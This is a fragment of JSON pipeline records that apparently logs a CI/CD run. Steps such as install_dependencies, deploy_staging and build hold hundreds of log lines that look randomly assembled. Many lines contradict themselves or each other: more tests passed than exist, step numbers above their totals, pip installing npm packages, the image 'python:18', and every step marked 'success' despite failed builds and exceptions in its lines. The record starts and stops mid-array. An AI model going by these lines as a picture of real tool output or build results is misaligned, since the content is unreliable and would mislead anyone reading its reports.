          "Step 19/22: Running migrations",
          "Optimizing 81 modules...",
          "\u2713 Step 'install' succeeded",
          "Layer 6/11: ENV command",
          "[12:46:31] ERROR: Connection failed",
          "Snapshots: 37 passed, 19 total",
          "Waiting...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: node:18",
          "[12:46:31] DEBUG: Connection pool: 14 active",
          "[12:46:31] INFO: Processing request",
          "Finished.",
          "Test Suites: 50 passed, 26 total",
          "[12:46:31] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "GET /health - 201 (25ms)",
          "Waiting...",
          "\u2713 Task completed in 1752ms",
          "Completed.",
          "Pushing to registry...",
          "Ran 17 tests in 59s",
          "GET /api - 201 (97ms)",
          "Environment: staging",
          "Test Suites: 39 passed, 30 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:31] INFO: Cache refreshed",
          "Installing express@1.18.3",
          "\u2713 build completed",
          "Waiting...",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 65 tests in 60s",
          "Uploading artifact 'coverage' (45 files)",
          "npm install: resolved 1687 packages",
          "[12:46:31] DEBUG: Loading configuration",
          "[12:46:31] INFO: Connecting to database",
          "Layer 9/9: RUN command",
          "[12:46:31] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Tests: 82 passed, 450 total",
          "Fetching from https://docker.io/package.json",
          "Ready.",
          "Building Docker image...",
          "[12:46:31] DEBUG: Initializing service",
          "Tests: 454 passed, 390 total",
          "Compiling lib/index.js...",
          "[12:46:31] INFO: Connecting to database",
          "Step 8/22: Running migrations",
          "Ready.",
          "npm install: resolved 575 packages",
          "Step 10/22: Running migrations",
          "pip: Collecting jest",
          "[12:46:31] INFO: Request completed",
          "Compiling utils/utils.go...",
          "\u2713 Task completed in 3292ms",
          "Uploading artifact 'dist' (20 files)",
          "Snapshots: 29 passed, 5 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "Compiling lib/handler.rs...",
          "\u2713 test completed",
          "Done.",
          "  PASS: test_api_health (201ms)",
          "GET /health - 201 (68ms)",
          "  PASS: test_user_create (251ms)",
          "[12:46:31] WARN: Deprecated API usage",
          "Ready.",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-28T12:46:36.355238",
        "finished_at": "2025-11-28T12:47:10.763773",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Switched to branch 'bugfix/task-882'",
          "Using Node.js 18.2.1",
          "Loading...",
          "Layer 10/10: RUN command",
          "Waiting...",
          "Artifact uploaded: dist.zip (39MB)",
          "[12:46:31] INFO: Starting build process",
          "Ran 100 tests in 16s",
          "HEAD is now at cdb28c3",
          "Connection established",
          "npm notice: package.json updated",
          "Completed.",
          "Uploading artifact 'coverage' (22 files)",
          "npm notice: package.json updated",
          "Tests: 198 passed, 236 total",
          "npm install: added 66 packages",
          "Step 15/18: Building",
          "[12:46:31] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "Pulling image: python:18",
          "Optimizing 67 modules...",
          "Step 11/20: Building",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (47MB)",
          "pip: Collecting webpack",
          "Ran 49 tests in 50s",
          "npm notice: package.json updated",
          "Layer 2/12: ENV command",
          "[12:46:31] DEBUG: Initializing service",
          "Ready.",
          "pip install: Successfully installed express-1.12",
          "[12:46:31] DEBUG: Connection pool: 7 active",
          "Generating source maps...",
          "Step 15/23: Linting",
          "\u2713 Task completed in 388ms",
          "Compiling lib/main.py...",
          "[12:46:31] WARN: Deprecated API usage",
          "Step 15/22: Linting",
          "Already up to date.",
          "Fetching submodules...",
          "Processing...",
          "Snapshots: 7 passed, 32 total",
          "Transforming 427 files...",
          "Cache hit for key-7870",
          "Image pulled successfully",
          "Installing webpack@1.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:31] DEBUG: Memory usage: 763MB",
          "npm install: resolved 1952 packages",
          "Processing...",
          "Pulling image: python:3.11",
          "Platform: win32-x64",
          "POST /upload - 202 (164ms)",
          "WARNING: express has known vulnerabilities",
          "Artifact downloaded: 39MB",
          "[12:46:31] INFO: Cache refreshed",
          "Step 10/21: Linting",
          "Cache hit for key-6893",
          "Already up to date.",
          "\u2713 test completed",
          "[12:46:31] INFO: Processing request",
          "FAILED: test_api_health",
          "Building Docker image...",
          "Success!",
          "Cache restored successfully (449MB)",
          "npm notice: package.json updated",
          "Success!",
          "Fetching from https://registry.npmjs.org/package.json",
          "  PASS: test_api_health (256ms)",
          "Coverage: 70% statements, 68% branches",
          "pip: Collecting webpack",
          "[12:46:31] WARN: Deprecated API usage",
          "Snapshots: 18 passed, 29 total",
          "Coverage: 71% statements, 87% branches",
          "Installing lodash@3.20.10",
          "Success!",
          "Fetching from https://gcr.io/package.json",
          "Fetching submodules...",
          "npm install: added 278 packages",
          "Connection established",
          "Pushing to registry...",
          "Environment: production",
          "Ready.",
          "Minifying main.js",
          "\u2713 All checks passed",
          "Installing eslint@4.1.10",
          "Cache miss for key-3699",
          "Cache miss for key-4381",
          "pip: Collecting prettier",
          "POST /api - 200 (127ms)",
          "Tests: 458 passed, 201 total",
          "Cache miss for key-9104",
          "Done.",
          "Compiling lib/main.py...",
          "Building Docker image...",
          "Cache saved successfully",
          "Connection established",
          "Bundling main.css",
          "Cache miss for key-5680",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "Transforming 915 files...",
          "[12:46:31] INFO: Cache refreshed",
          "Pushing to registry...",
          "Compiling lib/service.java...",
          "Using Python 3.11",
          "Installing eslint@4.4.4",
          "Done.",
          "pip: Downloading webpack-4.17.tar.gz",
          "Pulling image: python:18",
          "FAILED: test_user_create",
          "Done.",
          "Step 6/15: Testing",
          "npm notice: package.json updated",
          "Step 17/25: Deploying",
          "pip install: Successfully installed lodash-2.13",
          "Step 15/19: Testing",
          "[12:46:31] INFO: Cache refreshed",
          "FAILED: test_auth_login",
          "HEAD is now at 90e2208",
          "Bundling vendor.js",
          "Compiling utils/utils.go...",
          "Fetching submodules...",
          "Compiling lib/app.ts...",
          "Step 12/21: Running migrations",
          "[12:46:31] DEBUG: Query executed in 79ms",
          "[12:46:31] WARN: Deprecated API usage",
          "Cache saved successfully",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-28T12:47:10.763773",
        "finished_at": "2025-11-28T12:47:22.233285",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:46:31] DEBUG: Initializing service",
          "Using Node.js 20.12.4",
          "npm install: resolved 524 packages",
          "Verifying...",
          "Step 6/15: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Tests: 154 passed, 448 total",
          "Creating production build...",
          "Using Python 3.10",
          "Done.",
          "Pushing to registry...",
          "[12:46:31] INFO: Request completed",
          "Artifact uploaded: dist.zip (32MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "\u2713 build completed",
          "Verifying...",
          "  PASS: test_user_create (494ms)",
          "Cache restored successfully (495MB)",
          "Already up to date.",
          "HEAD is now at 802885a",
          "Exception: ValueError",
          "Exception: NullPointerException",
          "[12:46:31] INFO: Request completed",
          "\u2713 deploy completed",
          "POST /data - 200 (108ms)",
          "npm install: resolved 281 packages",
          "pip install: Successfully installed eslint-1.14",
          "Test Suites: 38 passed, 6 total",
          "FAILED: test_auth_login",
          "Step 3/16: Deploying",
          "TLS handshake completed",
          "Cache saved successfully",
          "Uploading artifact 'dist' (5 files)",
          "Waiting...",
          "OK",
          "Generating source maps...",
          "Compiling src/main.py...",
          "Switched to branch 'bugfix/task-802'",
          "\u2713 Step 'build' succeeded",
          "Verifying...",
          "Minifying app.js",
          "Layer 6/12: ENV command",
          "Snapshots: 47 passed, 2 total",
          "[12:46:31] WARN: Deprecated API usage",
          "Waiting...",
          "HEAD is now at 13dcacf",
          "Test Suites: 39 passed, 24 total",
          "[12:46:31] DEBUG: Initializing service",
          "\u2713 Task completed in 1837ms",
          "Coverage: 92% statements, 66% branches",
          "Using Node.js 14.0.8",
          "Waiting...",
          "Environment: development",
          "[12:46:31] INFO: Request completed",
          "[12:46:31] DEBUG: Connection pool: 20 active",
          "[12:46:31] INFO: Request completed",
          "HEAD is now at b7b2909",
          "Transforming 730 files...",
          "Test Suites: 15 passed, 23 total",
          "[12:46:31] WARN: Deprecated API usage",
          "Installing axios@5.6.4",
          "Connection established",
          "Verifying...",
          "npm install: resolved 698 packages",
          "pip: Downloading webpack-2.16.tar.gz",
          "Installing axios@4.9.7",
          "[12:46:31] INFO: Cache refreshed",
          "Switched to branch 'bugfix/task-841'",
          "Cache invalidated: build",
          "Connection established",
          "[12:46:31] DEBUG: Connection pool: 11 active",
          "Verifying...",
          "Exception: RuntimeError",
          "\u2713 Task completed in 1699ms",
          "POST /upload - 200 (450ms)",
          "[12:46:31] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Already up to date.",
          "Step 2/18: Installing dependencies",
          "npm notice: package.json updated",
          "npm install: added 126 packages",
          "Step 11/17: Building",
          "[12:46:31] INFO: Cache refreshed",
          "Checking out main branch",
          "Layer 3/10: COPY command",
          "Cache saved successfully",
          "Uploading artifact 'coverage' (44 files)",
          "Artifact downloaded: 49MB",
          "Compiling components/app.ts...",
          "Checking out master branch",
          "Compiling components/utils.go...",
          "Step 9/18: Running migrations",
          "[12:46:31] DEBUG: Memory usage: 106MB",
          "[12:46:31] DEBUG: Query executed in 69ms",
          "Minifying vendor.js",
          "Step 20/20: Building",
          "Cache saved successfully",
          "Transforming 724 files...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:31] INFO: Connecting to database",
          "HEAD is now at d41593d",
          "Using Python 3.11",
          "pip: Collecting react",
          "pip install: Successfully installed lodash-1.18",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache miss for key-5654",
          "Bundling runtime.css",
          "Building Docker image...",
          "[12:46:31] WARN: Deprecated API usage",
          "Step 20/18: Installing dependencies",
          "Completed.",
          "Step 17/15: Running migrations",
          "[12:46:31] DEBUG: Query executed in 11ms",
          "Transforming 790 files...",
          "WARNING: eslint has known vulnerabilities",
          "Bundling styles.js",
          "Test Suites: 9 passed, 10 total",
          "Creating production build...",
          "Compiling utils/handler.rs...",
          "Connection established",
          "Step 15/21: Installing dependencies",
          "Switched to branch 'bugfix/task-593'",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 26.32s",
          "Exception: NullPointerException",
          "Cache saved successfully",
          "Environment: test",
          "Finished.",
          "Step 13/21: Running migrations",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-28T12:47:22.233285",
        "finished_at": "2025-11-28T12:47:33.702797",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Done.",
          "NODE_ENV=development",
          "Optimizing 28 modules...",
          "Building Docker image...",
          "Step 8/20: Linting",
          "Artifact uploaded: dist.zip (99MB)",
          "Cache hit for key-4057",
          "WARNING: express has known vulnerabilities",
          "[12:46:31] WARN: Deprecated API usage",
          "pip: Downloading prettier-4.9.tar.gz",
          "[12:46:31] DEBUG: Memory usage: 150MB",
          "HEAD is now at 7f41c68",
          "Bundling runtime.js",
          "\u2713 Step 'test' succeeded",
          "Compiling components/handler.rs...",
          "\u2713 Step 'setup' succeeded",
          "[12:46:31] WARN: Deprecated API usage",
          "  PASS: unit/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (77MB)",
          "OK",
          "[12:46:31] DEBUG: Connection pool: 10 active",
          "Ran 35 tests in 59s",
          "pip: Downloading express-1.13.tar.gz",
          "Loading...",
          "[12:46:31] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:46:31] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Test Suites: 49 passed, 40 total",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: unit/test_user_create.spec.js",
          "\u2717 build failed with exit code 63",
          "Compiling components/app.ts...",
          "Cache saved successfully",
          "Tests: 189 passed, 94 total",
          "npm install: added 411 packages",
          "Step 8/24: Installing dependencies",
          "Compiling lib/utils.go...",
          "Step 1/18: Testing",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "FAILED: test_api_health",
          "Cache restored successfully (46MB)",
          "Using Node.js 19.12.6",
          "Verifying...",
          "\u2717 build failed with exit code 58",
          "Layer 6/14: COPY command",
          "[12:46:31] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Ran 113 tests in 12s",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "Step 15/25: Building",
          "OK",
          "GET /status - 200 (47ms)",
          "Transforming 868 files...",
          "[12:46:31] DEBUG: Initializing service",
          "Already up to date.",
          "Cache hit for key-2979",
          "Fetching from https://githubusercontent.com/package.json",
          "npm install: resolved 811 packages",
          "\u2713 Task completed in 1437ms",
          "[12:46:31] INFO: Connecting to database",
          "npm install: resolved 979 packages",
          "Optimizing 86 modules...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:46:31] DEBUG: Connection pool: 8 active",
          "Cache miss for key-9349",
          "Loading...",
          "npm install: added 271 packages",
          "Success!",
          "HEAD is now at 82a473a",
          "Minifying app.js",
          "Finished.",
          "POST /api - 202 (86ms)",
          "Step 16/18: Linting",
          "Snapshots: 49 passed, 28 total",
          "Fetching from https://registry.npmjs.org/package.json",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:31] WARN: Deprecated API usage",
          "HEAD is now at 4462cb1",
          "  PASS: e2e/test_cache_hit.spec.js",
          "WARNING: axios has known vulnerabilities",
          "Step 20/21: Installing dependencies",
          "pip: Collecting prettier",
          "[12:46:31] DEBUG: Initializing service",
          "pip: Collecting webpack",
          "Completed.",
          "Image pulled successfully",
          "Step 3/21: Testing",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Bundling vendor.css",
          "[12:46:31] DEBUG: Connection pool: 2 active",
          "Artifact downloaded: 24MB",
          "Success!",
          "Snapshots: 3 passed, 22 total",
          "Generating source maps...",
          "[12:46:31] DEBUG: Connection pool: 14 active",
          "Compiling components/service.java...",
          "Generating source maps...",
          "Loading...",
          "Cache restored successfully (396MB)",
          "Compiling lib/index.js...",
          "Completed.",
          "Ran 156 tests in 49s",
          "[12:46:31] INFO: Starting build process",
          "Uploading artifact 'coverage' (33 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 223 files...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Processing...",
          "Step 14/17: Installing dependencies",
          "Step 14/16: Linting",
          "[12:46:31] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Verifying...",
          "Ran 145 tests in 14s",
          "\u2713 All checks passed",
          "[12:46:31] DEBUG: Loading configuration",
          "Connection established",
          "Minifying app.js",
          "pip install: Successfully installed prettier-5.12",
          "Generating source maps...",
          "pip: Downloading webpack-4.9.tar.gz",
          "\u2713 Task completed in 3089ms",
          "Platform: win32-x64",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-28T12:47:33.702797",
        "finished_at": "2025-11-28T12:48:08.111332",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u2713 Task completed in 1724ms",
          "[12:46:31] WARN: Deprecated API usage",
          "Pushing to registry...",
          "\u2713 validate completed",
          "Pulling image: python:18",
          "Cache hit for key-1431",
          "Step 15/19: Installing dependencies",
          "Checking out develop branch",
          "Time: 77.861s",
          "Tests: 117 passed, 417 total",
          "Cache invalidated: build",
          "Using Node.js 14.18.5",
          "Artifact uploaded: dist.zip (32MB)",
          "yarn add: Done in 1.50s",
          "Fetching from https://amazonaws.com/package.json",
          "Environment: development",
          "npm notice: created a lockfile",
          "Ready.",
          "HEAD is now at a0c711a",
          "Step 18/24: Deploying",
          "Ran 110 tests in 42s",
          "pip: Downloading express-2.4.tar.gz",
          "GET /status - 201 (43ms)",
          "Loading...",
          "OK",
          "Checking out develop branch",
          "Connection established",
          "Success!",
          "\u2713 validate completed",
          "Processing...",
          "  PASS: test_api_health (471ms)",
          "Compiling utils/index.js...",
          "Finished.",
          "[12:46:31] ERROR: Connection failed",
          "Snapshots: 37 passed, 6 total",
          "npm install: added 364 packages",
          "Bundling styles.js",
          "Switched to branch 'bugfix/task-206'",
          "[12:46:31] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Already up to date.",
          "TLS handshake completed",
          "\u2717 build failed with exit code 67",
          "Ready.",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling utils/utils.go...",
          "Building Docker image...",
          "Step 13/19: Linting",
          "[12:46:31] WARN: Deprecated API usage",
          "Optimizing 64 modules...",
          "[12:46:31] INFO: Request completed",
          "[12:46:31] INFO: Connecting to database",
          "yarn add: Done in 5.55s",
          "  PASS: unit/test_user_create.spec.js",
          "Cache restored successfully (150MB)",
          "Cache hit for key-3531",
          "Processing...",
          "[12:46:31] DEBUG: Initializing service",
          "Using Node.js 16.19.5",
          "[12:46:31] DEBUG: Connection pool: 8 active",
          "Checking out develop branch",
          "npm install: added 295 packages",
          "pip install: Successfully installed lodash-2.0",
          "Fetching from https://gcr.io/package.json",
          "Tests: 240 passed, 66 total",
          "Processing...",
          "Switched to branch 'bugfix/task-571'",
          "Time: 115.60s",
          "Pushing to registry...",
          "Compiling components/app.ts...",
          "Switched to branch 'hotfix/task-547'",
          "Cache miss for key-1709",
          "Connection established",
          "TLS handshake completed",
          "Loading...",
          "Loading...",
          "Creating production build...",
          "\u2713 Step 'checkout' succeeded",
          "Done.",
          "Done.",
          "Creating production build...",
          "[12:46:31] INFO: Request completed",
          "TLS handshake completed",
          "Step 8/20: Building",
          "WARNING: lodash has known vulnerabilities",
          "Exception: TypeError",
          "Finished.",
          "Success!",
          "Cache miss for key-6105",
          "POST /upload - 200 (466ms)",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:31] ERROR: Connection failed",
          "POST /api - 200 (78ms)",
          "Using Python 3.11",
          "Fetching from https://googleapis.com/package.json",
          "Step 15/21: Testing",
          "TLS handshake completed",
          "Image pulled successfully",
          "Pulling image: python:latest",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Environment: development",
          "pip install: Successfully installed express-2.4",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "TLS handshake completed",
          "[12:46:31] INFO: Request completed",
          "[12:46:31] INFO: Starting build process",
          "Step 11/19: Deploying",
          "  PASS: unit/test_api_health.spec.js",
          "Image pulled successfully",
          "[12:46:31] INFO: Connecting to database",
          "Compiling utils/index.js...",
          "Artifact downloaded: 15MB",
          "Using Node.js 15.5.1",
          "Step 4/24: Building",
          "[12:46:31] WARN: Deprecated API usage",
          "yarn add: Done in 19.25s",
          "Environment: staging",
          "Cache saved successfully",
          "OK",
          "Connection established",
          "npm install: added 178 packages",
          "[12:46:31] INFO: Starting build process",
          "[12:46:31] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Snapshots: 12 passed, 44 total",
          "Cache invalidated: node_modules",
          "Platform: win32-x64",
          "Finished.",
          "Ran 121 tests in 1s",
          "Step 17/21: Running migrations",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-28T12:48:08.111332",
        "finished_at": "2025-11-28T12:48:19.580844",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:46:31] DEBUG: Connection pool: 14 active",
          "Pushing to registry...",
          "Installing react@3.10.7",
          "Checking out master branch",
          "npm notice: package.json updated",
          "[12:46:31] DEBUG: Connection pool: 3 active",
          "Creating production build...",
          "Artifact uploaded: dist.zip (66MB)",
          "npm notice: created a lockfile",
          "npm install: resolved 574 packages",
          "npm notice: created a lockfile",
          "npm install: resolved 355 packages",
          "Bundling main.css",
          "Image pulled successfully",
          "Waiting...",
          "pip: Installing build dependencies...",
          "Finished.",
          "Compiling utils/index.js...",
          "Switched to branch 'feature/task-151'",
          "Using Node.js 18.18.6",
          "Compiling utils/service.java...",
          "\u2713 Step 'checkout' succeeded",
          "Finished.",
          "Cache restored successfully (244MB)",
          "Compiling utils/main.py...",
          "Step 6/19: Deploying",
          "Switched to branch 'bugfix/task-314'",
          "\u2713 Task completed in 2467ms",
          "npm notice: package.json updated",
          "Compiling src/utils.go...",
          "Ran 56 tests in 43s",
          "Compiling lib/utils.go...",
          "Cache hit for key-1067",
          "Coverage: 82% statements, 62% branches",
          "[12:46:31] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (10 files)",
          "Platform: win32-x64",
          "Cache hit for key-3732",
          "Connection established",
          "Pulling image: alpine:latest",
          "[12:46:31] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Snapshots: 45 passed, 49 total",
          "pip install: Successfully installed eslint-3.2",
          "Transforming 422 files...",
          "Compiling src/index.js...",
          "Verifying...",
          "Step 11/21: Running migrations",
          "pip install: Successfully installed lodash-2.3",
          "  PASS: test_auth_login (372ms)",
          "pip: Downloading axios-3.0.tar.gz",
          "Verifying...",
          "  PASS: integration/test_auth_login.spec.js",
          "pip: Downloading lodash-1.14.tar.gz",
          "Switched to branch 'bugfix/task-592'",
          "Finished.",
          "[12:46:31] INFO: Request completed",
          "Connection established",
          "GET /status - 204 (5ms)",
          "Using Python 3.10",
          "[12:46:31] INFO: Connecting to database",
          "Pushing to registry...",
          "Installing express@1.5.6",
          "NODE_ENV=production",
          "Uploading artifact 'coverage' (42 files)",
          "Compiling components/handler.rs...",
          "npm notice: package.json updated",
          "Step 12/17: Linting",
          "pip: Collecting react",
          "Fetching from https://github.com/package.json",
          "  PASS: test_cache_hit (166ms)",
          "Coverage: 75% statements, 60% branches",
          "Exception: RuntimeError",
          "npm notice: created a lockfile",
          "Transforming 978 files...",
          "Step 17/25: Testing",
          "Transforming 277 files...",
          "Cache saved successfully",
          "[12:46:31] INFO: Starting build process",
          "Compiling components/app.ts...",
          "[12:46:31] INFO: Connecting to database",
          "Step 18/25: Linting",
          "FAILED: test_api_health",
          "Loading...",
          "POST /upload - 202 (266ms)",
          "[12:46:31] DEBUG: Connection pool: 14 active",
          "Finished.",
          "Bundling vendor.css",
          "Compiling src/app.ts...",
          "Waiting...",
          "WARNING: webpack has known vulnerabilities",
          "Compiling utils/app.ts...",
          "\u2713 Task completed in 661ms",
          "POST /data - 200 (223ms)",
          "  PASS: unit/test_cache_hit.spec.js",
          "Pushing to registry...",
          "Installing react@2.17.0",
          "Success!",
          "Fetching from https://gcr.io/package.json",
          "npm notice: package.json updated",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Image pulled successfully",
          "WARNING: lodash has known vulnerabilities",
          "Processing...",
          "[12:46:31] INFO: Processing request",
          "\u2717 build failed with exit code 49",
          "Image pulled successfully",
          "Cache miss for key-9762",
          "[12:46:31] DEBUG: Memory usage: 237MB",
          "Using Python 3.12",
          "Done.",
          "\u2713 All checks passed",
          "Cache invalidated: build",
          "Ran 108 tests in 42s",
          "Time: 8.320s",
          "Tests: 265 passed, 243 total",
          "Time: 51.128s",
          "Fetching submodules...",
          "Compiling src/utils.go...",
          "Using Node.js 15.8.8",
          "Image pulled successfully",
          "Processing...",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:46:31] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "NODE_ENV=development",
          "OK",
          "Pulling image: python:3.11",
          "npm install: resolved 1667 packages",
          "Step 20/17: Deploying",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-28T12:48:19.580844",
        "finished_at": "2025-11-28T12:48:53.989379",
        "log_lines": [
          "=== Step: build ===",
          "Compiling utils/main.py...",
          "Step 18/17: Linting",
          "POST /data - 202 (431ms)",
          "OK",
          "pip install: Successfully installed axios-4.3",
          "[12:46:31] DEBUG: Connection pool: 7 active",
          "Success!",
          "Coverage: 85% statements, 84% branches",
          "[12:46:31] DEBUG: Connection pool: 2 active",
          "Minifying vendor.js",
          "Image pulled successfully",
          "Using Node.js 19.6.7",
          "Generating source maps...",
          "yarn add: Done in 14.9s",
          "Environment: staging",
          "[12:46:31] WARN: Deprecated API usage",
          "yarn add: Done in 10.84s",
          "Waiting...",
          "Fetching from https://amazonaws.com/package.json",
          "HEAD is now at 76fa4fb",
          "[12:46:31] DEBUG: Loading configuration",
          "OK",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:46:31] DEBUG: Memory usage: 1226MB",
          "\u2713 package completed",
          "Checking out develop branch",
          "[12:46:31] INFO: Processing request",
          "Using Node.js 16.11.1",
          "\u2713 All checks passed",
          "[12:46:31] DEBUG: Query executed in 74ms",
          "Time: 15.311s",
          "Layer 2/14: ENV command",
          "Bundling styles.css",
          "[12:46:31] INFO: Cache refreshed",
          "Artifact downloaded: 17MB",
          "Compiling components/app.ts...",
          "npm notice: package.json updated",
          "[12:46:31] ERROR: Connection failed",
          "[12:46:31] DEBUG: Initializing service",
          "Already up to date.",
          "[12:46:31] DEBUG: Query executed in 33ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "Finished.",
          "Compiling utils/handler.rs...",
          "NODE_ENV=test",
          "OK",
          "Uploading artifact 'build' (32 files)",
          "Loading...",
          "Compiling src/index.js...",
          "Cache miss for key-5296",
          "yarn add: Done in 14.18s",
          "Cache restored successfully (235MB)",
          "Switched to branch 'feature/task-133'",
          "Step 13/24: Running migrations",
          "Minifying main.js",
          "Connection established",
          "Cache restored successfully (477MB)",
          "Environment: staging",
          "\u2713 build completed",
          "npm install: added 230 packages",
          "[12:46:31] DEBUG: Memory usage: 1441MB",
          "Time: 75.975s",
          "Waiting...",
          "npm install: resolved 1273 packages",
          "Finished.",
          "[12:46:31] DEBUG: Memory usage: 896MB",
          "NODE_ENV=development",
          "Coverage: 81% statements, 88% branches",
          "Connection established",
          "[12:46:31] WARN: Deprecated API usage",
          "[12:46:31] INFO: Cache refreshed",
          "Cache restored successfully (170MB)",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "Environment: staging",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: node:latest",
          "Checking out master branch",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:31] INFO: Cache refreshed",
          "[12:46:31] INFO: Cache refreshed",
          "Done.",
          "Done.",
          "Cache invalidated: dependencies",
          "Optimizing 90 modules...",
          "Fetching submodules...",
          "[12:46:31] INFO: Cache refreshed",
          "[12:46:31] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "Success!",
          "Checking out master branch",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (46MB)",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Compiling src/app.ts...",
          "[12:46:31] INFO: Starting build process",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling utils/utils.go...",
          "\u2713 Task completed in 2225ms",
          "OK",
          "\u2713 deploy completed",
          "\u2713 Task completed in 4730ms",
          "\u2713 Task completed in 2434ms",
          "Cache hit for key-5249",
          "Waiting...",
          "yarn add: Done in 7.16s",
          "[12:46:31] DEBUG: Loading configuration",
          "[12:46:31] INFO: Request completed",
          "Step 1/22: Deploying",
          "Tests: 375 passed, 355 total",
          "npm install: added 177 packages",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Fetching from https://github.com/package.json",
          "HEAD is now at 33a08c5",
          "npm install: added 268 packages",
          "POST /data - 200 (148ms)",
          "Waiting...",
          "Using Node.js 16.1.9",
          "Step 19/20: Running migrations",
          "Artifact downloaded: 11MB",
          "Tests: 467 passed, 441 total",
          "Completed.",
          "Time: 29.874s",
          "Image pulled successfully",
          "Tests: 368 passed, 454 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/24: Running migrations",
          "FAILED: test_db_connect",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-28T12:48:53.989379",
        "finished_at": "2025-11-28T12:49:05.458891",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Switched to branch 'hotfix/task-946'",
          "[12:46:31] WARN: Deprecated API usage",
          "[12:46:31] WARN: Deprecated API usage",
          "[12:46:31] DEBUG: Connection pool: 4 active",
          "[12:46:31] DEBUG: Connection pool: 14 active",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Snapshots: 14 passed, 3 total",
          "Uploading artifact 'dist' (10 files)",
          "Cache restored successfully (217MB)",
          "\u2713 All checks passed",
          "Step 11/19: Deploying",
          "Compiling utils/index.js...",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Snapshots: 47 passed, 2 total",
          "Cache hit for key-1440",
          "Using Node.js 20.1.0",
          "Artifact downloaded: 30MB",
          "POST /upload - 200 (486ms)",
          "Step 13/17: Testing",
          "Installing jest@5.20.9",
          "TLS handshake completed",
          "Tests: 197 passed, 401 total",
          "Image pulled successfully",
          "Optimizing 62 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 33MB",
          "Building Docker image...",
